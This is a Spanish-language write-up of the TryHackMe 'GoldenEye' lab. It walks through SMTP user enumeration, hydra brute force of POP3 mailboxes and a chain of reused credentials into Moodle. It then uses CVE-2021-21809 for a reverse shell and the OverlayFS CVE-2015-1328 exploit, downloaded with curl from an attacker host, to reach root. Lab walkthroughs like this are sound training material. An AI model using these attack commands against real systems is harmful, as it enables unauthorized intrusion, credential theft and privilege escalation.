---
title: "GoldenEye"
date: 2026-09-30
categories: [TryHackMe, Medium]
tags: [linux, apache, smtp, postfix, pop3, dovecot, smtp user enumeration, html entity encoding, basic auth, hydra, password brute force, credential reuse, moodle, cve-2021-21809, RCE, exiftool, metadata, kernel exploit, cve-2015-1328, OverlayFS, privilege escalation, nmap, curl, python, gobuster, netcat, searchsploit, cc]
image:
  path: /assets/img/THM/GoldenEye/banner.webp
  lqip: "data:image/webp;base64,UklGRuwCAABXRUJQVlA4WAoAAAAQAAAAHwAAHwAAQUxQSFACAAABoHNr27HNXdDzqZvOtmd6W52t2HZS2bYzNmJ7bNvGxwevHt73dRQP3kTEBKiMwUWlM6NvXPTIXLhOdu9yg5BVqHOQLNZll3KvhGStrRWkjPAqGfU1k/ILdUiKvppHyhFMK01fKyKUV1ckUbiRR0gUSYMbQYLQZCH8n9d1Al4tQrJvN9Sm6eskN0Qk6qJp5r0oTaV4DnEp2CVN5tBMclQssF1AJE2o/RoNRA5AydYoDWidVn8XAgQuQskhLhFZ3Qc1CJtz4Fug9i//9PPFy9b+liI8bCEiiwPE1JQ2fnmsiIT5y0iC4oUjaErLoFjCdsG8YgN8gEr65hsirKWQl5y755NV//6z/MNffIYfRwNC3Yco7K9xLofWhRZdeg9baDs/vLxx2606AtB8VS8EH3FiB/kZo7f2NKo+O0r+K5a8Q5Rw+BsiPnQvbn7xDmMlq0Y2773jZ2jkwW0oQPOppflmR7DSMCo+CO4a18Z45eC/mGLfegMdO/UVuu49Xq+uqdhKC6OicjaLLAtO3OOKgGblRlh27Cujxtjww7H2VRXPuAe/t4jY/LhCg1KvHaT48b4OFc3WG2/dVmksvxB+ZCERfz3toxApPrsRZ+3bFRMXV8951xh4eDefWwgRGx+vRYngvfa+zYHJUwYYbefP+/PUHlbGUBx7cguIhj+f+XT30aX3Txi48NvCn9fYkICi8MnCq4CCfSsXfrv9XO3qo/4q4RuH9Au//H3WI9nb+OkZ/jgJq294rhd3i8KVjRu+/e/slTP/fvTqN3k5v9IvlRYCVlA4IHYAAAAQBACdASogACAAPuFipE2opiOiN/VYARAcCWYArAAX7t3E+AEsFCqAAAD+8HVzTo4vzrG7lGWWJD3oZXL4u9hIjjvyjHi2jHNa7Qe8Qj3/6ACCMQ600/31Q57kT6jAYHLAVCjq1//roHYywLBvz9rfzI5PnAAA"
  alt: GoldenEye writeup
---

GoldenEye es una máquina Linux Medium de TryHackMe con temática de la película de Bond, y se gana la dificultad con un largo rastro de enumeración más que con un solo bug ingenioso. Una contraseña codificada escondida en el JavaScript de una página abre una zona con basic-auth; el SMTP confirma qué usuarios son reales; y una cadena de buzones POP3 —cada uno fuerza-bruteado, cada uno guardando el siguiente juego de credenciales— lleva a través de un Moodle de formación hasta su administrador. Desde ahí, **CVE-2021-21809** (una inyección de comandos en el corrector ortográfico de Moodle) da una shell como `www-data`, y un kernel antiguo cae ante el exploit de OverlayFS **CVE-2015-1328** para conseguir root.

| Campo      | Detalles   |
|------------|------------|
| Plataforma | TryHackMe  |
| Dificultad | Medium     |
| SO         | Linux      |
| IP         | 10.129.152.40 |
| Fecha      | Septiembre 2026 |

## Herramientas Usadas

| Herramienta  | Descripción                                                            |
|--------------|-----------------------------------------------------------------------|
| nmap         | Escáner de puertos y fingerprinting de servicios                      |
| curl         | Descarga de páginas y autenticación en la zona basic-auth             |
| python3      | Decodificó la contraseña codificada en HTML-entities del código fuente|
| gobuster     | Fuerza bruta de directorios contra la zona autenticada `/sev-home/`   |
| netcat (nc)  | Enumeración de usuarios SMTP con `VRFY` y lectura de buzones POP3      |
| hydra        | Fuerza bruta de contraseñas POP3 para boris, natalya y doak           |
| exiftool     | Leyó la contraseña de admin escondida en los metadatos EXIF de un JPEG|
| searchsploit | Encontró los exploits de Moodle y OverlayFS en Exploit-DB             |
| CVE-2021-21809 PoC | RCE del corrector de Moodle usado para el foothold              |
| cc           | Compiló el exploit de kernel de OverlayFS (no había `gcc` en el objetivo)|

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV -Pn -n 10.129.152.40 -oN nmap
```

```bash
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ...
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
55007/tcp open  pop3     Dovecot pop3d
```

Cuatro servicios, y la forma es peculiar: un stack de correo (**SMTP** en el 25, **POP3** en el puerto deliberadamente no estándar **55007**) junto a un servidor web. El verbo `VRFY` que anuncia el SMTP es un regalo para enumerar usuarios, y un servicio POP3 casi siempre significa que las credenciales serán la moneda de esta máquina.

### Web — El Servidor de Admin y una Contraseña Codificada

La página de inicio es una animación de terminal con temática, movida por `terminal.js`:

![La página de inicio del GoldenEye Primary Admin Server con su texto de terminal animado](/assets/img/THM/GoldenEye/cap1.png)

Leyendo el código de `terminal.js` aparece un comentario del desarrollador dirigido a "Boris", diciéndole que cambie su contraseña por defecto — y dejando amablemente la actual, "codificada", como una cadena de entidades HTML numéricas:

```text
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;...
```

Cada `&#NN;` es una referencia de carácter HTML decimal, así que decodificar es simplemente mapear cada número a su carácter ASCII:

```python
enc = "&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;"
print("".join(chr(int(n)) for n in enc.strip(";").split(";") if n))
# InvincibleHack3r
```

La página también nos dice que visitemos `/sev-home/`, protegida con HTTP basic auth — y `boris:InvincibleHack3r` entra:

![El prompt de autenticación HTTP basic-auth de la zona /sev-home/](/assets/img/THM/GoldenEye/cap2.png)

![La página de operadores de GoldenEye en /sev-home/ tras autenticarse como boris](/assets/img/THM/GoldenEye/cap3.png)

Un comentario HTML al final de esa página nombra a dos "GoldenEye Network Operator Supervisors" — **Natalya** y **Boris** — y el texto sugiere (en personaje) que POP3 corre en un puerto alto no estándar. Un escaneo de directorios autenticado de `/sev-home/` no encuentra nada más, así que el servicio de correo es el siguiente paso.

### Enumeración de Usuarios SMTP

Postfix todavía responde a `VRFY`, que confirma si existe un buzón local — perfecto para convertir los dos nombres en cuentas verificadas:

```bash
nc -nv 10.129.152.40 25
```

```bash
VRFY boris
252 2.0.0 boris
VRFY natalya
252 2.0.0 natalya
VRFY ander
550 5.1.1 <ander>: Recipient address rejected: User unknown
```

`boris` y `natalya` son reales; un nombre inventado es rechazado. La contraseña codificada *no* funciona en POP3, así que con usuarios válidos en mano, una fuerza bruta con un diccionario pequeño contra POP3 es la jugada (el SMTP no anuncia `AUTH`, así que no hay nada que forzar ahí):

```bash
hydra -l boris -P passwordsList.txt -s 55007 -f -t 4 10.129.152.40 pop3
# [55007][pop3] login: boris   password: secret1!
```

### El Rastro de Credenciales por POP3

Entrar en el buzón de Boris y leer sus mensajes es puro sabor (una nota de `alec@janus.boss` sobre esconder unos códigos de acceso), pero la misma fuerza bruta contra **natalya** acierta con `bird`, y *su* bandeja es donde empieza de verdad el rastro:

```bash
hydra -l natalya -P passwordsList.txt -s 55007 -f -t 4 10.129.152.40 pop3
# [55007][pop3] login: natalya   password: bird
```

El segundo mensaje de Natalya entrega un nuevo juego de credenciales y un dominio interno:

```text
Ok, user creds are:
username: xenia
password: RCP90rulez!

And if you didn't have the URL on our internal Domain:
severnaya-station.com/gnocertdir
Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Añadiendo el vhost a `/etc/hosts` el sitio de formación se vuelve accesible:

```bash
echo "10.129.152.40 severnaya-station.com" | sudo tee -a /etc/hosts
```

## El Sitio Moodle de Formación

`severnaya-station.com/gnocertdir` es una instalación de **Moodle 2.2.3**, y `xenia:RCP90rulez!` entra:

![El login de Moodle de la certificación GNO en severnaya-station.com/gnocertdir](/assets/img/THM/GoldenEye/cap4.png)

Moodle 2.2.3 es vulnerable a **CVE-2021-21809**, pero explotarlo necesita la cuenta de *administrador* para llegar a los ajustes del corrector ortográfico — así que el objetivo pasa a escalar dentro de la aplicación. Navegando como Xenia, un hilo de mensajes nombra a otro usuario, **doak**:

![Una conversación de mensajes en Moodle como xenia que revela al usuario doak](/assets/img/THM/GoldenEye/cap5.png)

La misma fuerza bruta POP3 funciona con `doak` (`goat`), y su buzón entrega el login del sitio `dr_doak:4England!`. Ya dentro de Moodle como Dr Doak, sus ficheros privados guardan un `s3cret.txt` que apunta a una imagen oculta:

![Los ficheros privados de Dr Doak en Moodle, con s3cret.txt](/assets/img/THM/GoldenEye/cap6.png)

```text
I was able to capture this apps adm1n cr3ds through clear txt.
Something juicy is located here: /dir007key/for-007.jpg
```

### La Contraseña de Admin en el EXIF

La imagen en sí parece anodina, pero la contraseña de administrador está metida en sus metadatos, no en sus píxeles:

![La imagen for-007.jpg obtenida de /dir007key/](/assets/img/THM/GoldenEye/cap7.png)

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
exiftool for-007.jpg
```

```bash
Image Description  : eFdpbnRlcjE5OTV4IQ==
```

El campo `Image Description` es base64, y decodifica a la contraseña del administrador de Moodle:

```bash
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```

## Acceso Inicial — CVE-2021-21809 (RCE del Corrector de Moodle) como `www-data`

Ya dentro de Moodle como `admin:xWinter1995x!`, la ruta del corrector es accesible. **CVE-2021-21809** abusa del corrector de TinyMCE: Moodle ejecuta un binario externo `aspell` cuya ruta es un ajuste controlado por el admin, así que apuntar esa "ruta" a un comando de shell y luego disparar el RPC del corrector lo ejecuta en el servidor. Los dos cambios de ajustes son poner el motor del corrector en **PSpellShell** y escribir el payload en la ruta de aspell:

![Los ajustes del editor TinyMCE de Moodle, cambiando el motor del corrector a PSpellShell](/assets/img/THM/GoldenEye/cap8.png)

Un PoC público (el `CVE-2021-21809` de anldori) automatiza toda la secuencia — login, leer la clave de sesión, poner ambos ajustes y luego pegarle a `rpc.php` para disparar el payload. Necesita una sesión que persista entre peticiones (un `requests.Session()`), las credenciales de admin y un listener; el payload es una reverse shell basada en `telnet` porque el objetivo es minimalista:

```bash
python3 CVE-2021-21809.py
# Login successfully.
# Changed spell check to PSpellShell.
# Payload sent.
```

```bash
nc -nvlp 4444
```

```bash
Connection received on 10.129.152.40
whoami
www-data
```

## Escalada de Privilegios — `www-data` → `root` (CVE-2015-1328 OverlayFS)

Tras el habitual tratamiento de la TTY, la versión del kernel es toda la historia de la escalada:

```bash
www-data@ubuntu:/$ uname -r
3.13.0-32-generic
```

Ese kernel es vulnerable a **CVE-2015-1328**, la escalada local de OverlayFS — un fallo en cómo OverlayFS gestionaba los permisos de ficheros entre mount namespaces, explotable para ejecución de código arbitrario como root. Exploit-DB trae un exploit en C ya hecho (37292):

```bash
searchsploit -m linux/local/37292.c
```

El objetivo no tiene `gcc`, solo `cc`, así que la línea del exploit que compila una librería auxiliar necesita un ajuste antes de compilar en la máquina:

```c
// original
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
// editada
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Transfiriéndolo por un servidor HTTP rápido, compilando con `cc` y ejecutándolo cae una shell de root:

```bash
www-data@ubuntu:/tmp$ curl -s http://<ATTACKER_IP>:8000/37292.c -o exploit.c
www-data@ubuntu:/tmp$ cc exploit.c -o exploit && ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cat /root/.flag.txt
REDACTED
```

## Flags

| Flag       | Valor      |
|------------|------------|
| `/root/.flag.txt` | `REDACTED` |

## Conclusiones Clave

- **"Codificado" no es "cifrado".** La primera contraseña estaba escondida solo tras entidades HTML decimales — una representación reversible, no un cifrado. Todo lo que un navegador puede decodificar por sí solo, un atacante lo decodifica al instante; ofuscar en el código cliente no aporta nada.
- **`VRFY` convierte suposiciones en hechos.** El SMTP confirmó encantado qué usuarios eran reales, así que la fuerza bruta solo corrió contra cuentas que existían — enumerar primero y luego un diccionario diminuto es mucho más efectivo que lanzar una lista enorme contra usuarios desconocidos.
- **Un rastro de credenciales es tan fuerte como su contraseña reutilizada más débil.** Cada salto aquí —boris → natalya → doak → dr_doak → admin— vino de un buzón o un mensaje legible con la contraseña de la cuenta anterior. Contraseñas guardadas y enviadas en texto claro convirtieron una contraseña POP3 débil en admin completo de la aplicación.
- **Los metadatos son datos.** La contraseña de admin vivía en el campo EXIF `Image Description` de un JPEG, invisible en la imagen pero a un `exiftool` de distancia. Los ficheros exfiltrados durante una auditoría merecen una pasada de metadatos, no solo una mirada a su contenido.
- **Un kernel viejo es una shell de root esperando a pasar.** Una vez en la máquina, `uname -r` por sí solo decidió la escalada: el kernel 3.13 mapea directo a CVE-2015-1328. Mantener un host expuesto con un kernel de hace años convierte cualquier foothold, por limitado que sea, en un compromiso total — y que falte `gcc` solo significa editar una línea para usar `cc`.
